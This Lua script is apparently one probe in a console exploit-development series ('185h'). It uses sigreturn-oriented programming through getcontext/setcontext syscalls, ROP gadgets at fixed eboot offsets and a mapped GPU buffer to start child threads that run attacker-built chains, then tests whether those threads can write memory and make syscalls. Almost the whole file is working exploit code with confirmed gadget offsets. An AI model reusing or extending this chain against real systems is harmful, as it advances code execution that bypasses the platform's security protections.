-- CRASH_CLASS: LOW
-- PROBE 185h: Child thread getpid with confirmed gadget offsets
--
-- Gadgets confirmed by 185g:
--   mov [rdi],rax;ret at eboot+0x92C67
--   jmp $ at eboot+0x15481
--   pop rdi;ret at eboot+0xC9DFE
--
-- Child thread: syscall(getpid) -> mov [rdi],rax;ret -> jmp $

print("=== 185h: CHILD GETPID (FINAL) ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex64(val)
    local h, l = get_hi_lo(val)
    return string.format("0x%X%08X", h, l)
end
local function wq(a,v) memory.write_qword(a,v) end
local function wd(a,v) memory.write_dword(a,v) end
local function rd(a) return to_num(memory.read_dword(a)) end
local function rq(a) return memory.read_qword(a) end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

-- SROP
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local MC = 0x40
local ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(ctx)) end)
local brip = rq(ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(ctx)) end)
    wq(ctx + MC + 0xA0, sc_addr)
    wq(ctx + MC + 0x38, uint64(num))
    if a1 then wq(ctx + MC + 0x08, a1) end
    if a2 then wq(ctx + MC + 0x10, a2) end
    if a3 then wq(ctx + MC + 0x18, a3) end
    if a4 then wq(ctx + MC + 0x50, a4) end
    if a5 then wq(ctx + MC + 0x28, a5) end
    if a6 then wq(ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(ctx)) end)
    if not ok then return nil end
    return rv
end

-- GPU buffer
local _, gpu = pcall(function()
    return make_syscall(477)(uint64(0), uint64(0x80000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)
local function ga(off) return uint64(string.format("0x%X%08X", gh, gl + off)) end

-- Eboot base
local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local eb_lo = rd(info + 0x108)
local eb_hi = rd(info + 0x10C)

-- Gadgets
local mov_g = uint64(string.format("0x%X%08X", eb_hi, eb_lo + 0x92C67))
local jmp_g = uint64(string.format("0x%X%08X", eb_hi, eb_lo + 0x15481))
local pop_rdi_ret = uint64(string.format("0x%X%08X", eb_hi, eb_lo + 0xC9DFE))

print("sc=" .. hex64(sc_addr))
print("mov=" .. hex64(mov_g))
print("jmp=" .. hex64(jmp_g))
print("gpu=" .. hex64(gpu))

-- === TEST 1: Basic child write marker ===
print("")
print("--- T1: CHILD WRITE ---")

local MARKER = 0x10000
wq(gpu + MARKER, uint64(0))

-- Stack: [RSP] = jmp_g (after mov writes marker, spin forever)
local ST = 0x20000 - 8
wq(gpu + ST, jmp_g)

-- Child context
local TC = 0x30000
for i = 0, 0x4FF, 8 do wq(gpu + TC + i, uint64(0)) end
wq(gpu + TC + 0x108, uint64(0x480))  -- gate 1
wd(gpu + TC + 0x0D0, 0)              -- flags <= 7
wq(gpu + TC + 0x110, uint64(0x10000)) -- gate 3
wd(gpu + TC + 0x0C0, 0x43)           -- CS
wd(gpu + TC + 0x100, 0x3B)           -- SS
wq(gpu + TC + 0x0E0, mov_g)          -- RIP = mov [rdi], rax; ret
wq(gpu + TC + 0x0F8, ga(ST))         -- RSP
wq(gpu + TC + 0x048, ga(MARKER))     -- RDI = marker
wq(gpu + TC + 0x078, uint64(0xCAFEBABE))  -- RAX = value to write

local tb = memory.alloc(8)
wd(tb, 0)
local rv = srop(430, ga(TC), uint64(tb))
local cr = rv and to_num(rv) or -999
local ct = rd(tb)
print("create=" .. cr .. " tid=0x" .. string.format("%X", ct))

-- Wait 100ms
local TS = 0x38000
wq(gpu + TS, uint64(0))
wq(gpu + TS + 8, uint64(100000000))
srop(240, ga(TS), uint64(0))

local m = rq(gpu + MARKER)
print("marker=" .. hex64(m))
if to_num(m) == 0xCAFEBABE then
    print("!!! CHILD WROTE MARKER !!!")
end

-- === TEST 2: Child getpid via syscall ===
print("")
print("--- T2: CHILD GETPID ---")

local MARKER2 = 0x11000
wq(gpu + MARKER2, uint64(0))

-- Stack layout for child:
-- syscall;ret returns to [RSP+0] = mov_g
-- mov [rdi], rax; ret returns to [RSP+8] = jmp_g
local ST2 = 0x22000 - 16
wq(gpu + ST2, mov_g)      -- after syscall ret
wq(gpu + ST2 + 8, jmp_g)  -- after mov ret

local TC2 = 0x32000
for i = 0, 0x4FF, 8 do wq(gpu + TC2 + i, uint64(0)) end
wq(gpu + TC2 + 0x108, uint64(0x480))
wd(gpu + TC2 + 0x0D0, 0)
wq(gpu + TC2 + 0x110, uint64(0x10000))
wd(gpu + TC2 + 0x0C0, 0x43)
wd(gpu + TC2 + 0x100, 0x3B)
wq(gpu + TC2 + 0x0E0, sc_addr)        -- RIP = syscall;ret
wq(gpu + TC2 + 0x0F8, ga(ST2))        -- RSP
wq(gpu + TC2 + 0x048, ga(MARKER2))    -- RDI = marker (preserved across getpid)
wq(gpu + TC2 + 0x078, uint64(20))     -- RAX = getpid syscall number

wd(tb, 0)
rv = srop(430, ga(TC2), uint64(tb))
cr = rv and to_num(rv) or -999
local ct2 = rd(tb)
print("create=" .. cr .. " tid=0x" .. string.format("%X", ct2))

-- Wait 200ms
wq(gpu + TS + 8, uint64(200000000))
srop(240, ga(TS), uint64(0))

local m2 = rq(gpu + MARKER2)
local m2v = to_num(m2)
print("marker=" .. hex64(m2) .. " (" .. m2v .. ")")
print("expected_pid=" .. pid)

if m2v == pid then
    print("!!! CHILD GETPID MATCHES — CHILD SYSCALLS WORK !!!")
elseif m2v > 0 then
    print("child wrote " .. m2v .. " — nonzero but not pid")
    print("  (could be thread-specific pid or error)")
end

-- Check both children alive
if ct > 0 then
    rv = srop(431, uint64(ct), uint64(0))
    print("child1_alive=" .. (rv and to_num(rv) or -999))
end
if ct2 > 0 then
    rv = srop(431, uint64(ct2), uint64(0))
    print("child2_alive=" .. (rv and to_num(rv) or -999))
end

-- === TEST 3: Child thr_self ===
print("")
print("--- T3: CHILD THR_SELF ---")

local MARKER3 = 0x12000
wq(gpu + MARKER3, uint64(0))

-- thr_self(432) writes TID to the address in RDI
-- Stack: syscall;ret -> mov_g -> jmp_g
local ST3 = 0x24000 - 16
wq(gpu + ST3, mov_g)
wq(gpu + ST3 + 8, jmp_g)

local TC3 = 0x34000
for i = 0, 0x4FF, 8 do wq(gpu + TC3 + i, uint64(0)) end
wq(gpu + TC3 + 0x108, uint64(0x480))
wd(gpu + TC3 + 0x0D0, 0)
wq(gpu + TC3 + 0x110, uint64(0x10000))
wd(gpu + TC3 + 0x0C0, 0x43)
wd(gpu + TC3 + 0x100, 0x3B)
wq(gpu + TC3 + 0x0E0, sc_addr)
wq(gpu + TC3 + 0x0F8, ga(ST3))
wq(gpu + TC3 + 0x048, ga(MARKER3))  -- RDI = where thr_self writes TID
wq(gpu + TC3 + 0x078, uint64(432))  -- RAX = thr_self

wd(tb, 0)
rv = srop(430, ga(TC3), uint64(tb))
cr = rv and to_num(rv) or -999
local ct3 = rd(tb)
print("create=" .. cr .. " tid=0x" .. string.format("%X", ct3))

srop(240, ga(TS), uint64(0))

local m3 = rd(gpu + MARKER3)
print("marker_tid=0x" .. string.format("%X", m3))
print("create_tid=0x" .. string.format("%X", ct3))

if m3 == ct3 and m3 ~= 0 then
    print("!!! CHILD THR_SELF MATCHES CREATE TID !!!")
elseif m3 ~= 0 then
    print("child wrote TID 0x" .. string.format("%X", m3))
end

print("")
print("pid_post=" .. to_num(make_syscall(20)()))
print("=== DONE ===")
